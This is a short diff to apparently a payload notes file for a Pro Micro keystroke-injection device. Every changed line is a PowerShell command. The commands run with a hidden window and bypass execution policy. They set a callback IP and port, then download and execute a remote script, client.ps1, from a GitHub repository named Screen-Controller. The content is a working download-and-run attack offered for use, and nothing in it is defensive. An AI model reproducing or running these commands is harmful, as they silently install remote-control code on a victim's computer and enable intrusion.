@@ -8,11 +8,12 @@
 # ================================================================
 # METHOD 1: GITHUB (RECOMMENDED - No web server needed!)
 # ================================================================
+# IMPORTANT: Must pass your IP as variable!
 # FULL COMMAND (what Pro Micro types):
-powershell -W Hidden -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
+powershell -W Hidden -NoP -Exec Bypass -C "$c='192.168.8.158';$p=5555;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
 
 # VISIBLE VERSION (for testing - shows window):
-powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
+powershell -NoP -Exec Bypass -C "$c='192.168.8.158';$p=5555;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
 
 
 # ================================================================
